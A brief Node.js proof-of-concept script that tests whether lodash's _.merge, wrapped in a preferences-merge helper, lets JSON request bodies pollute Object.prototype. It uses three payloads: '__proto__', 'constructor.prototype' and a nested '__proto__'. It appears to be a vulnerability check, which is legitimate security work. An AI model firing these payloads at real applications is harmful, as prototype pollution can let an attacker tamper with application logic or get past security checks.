const _ = require('lodash');
function mergePreferences(current, input) { return _.merge({}, current, input); }

// Simulate express.json() parsing req.body (JSON.parse keeps __proto__ as own key)
const body1 = JSON.parse('{"__proto__":{"polluted1":true}}');
mergePreferences({}, body1);
console.log("JSON __proto__ -> polluted1:", ({}).polluted1);

const body2 = JSON.parse('{"constructor":{"prototype":{"polluted2":true}}}');
mergePreferences({}, body2);
console.log("JSON constructor.prototype -> polluted2:", ({}).polluted2);

// Nested path variant
const body3 = JSON.parse('{"a":{"__proto__":{"polluted3":true}}}');
mergePreferences({}, body3);
console.log("nested __proto__ -> polluted3:", ({}).polluted3);

// Check own keys to ensure merge ran
const out = mergePreferences({x:1}, {y:2});
console.log("merge result:", JSON.stringify(out));
console.log("lodash:", _.VERSION);
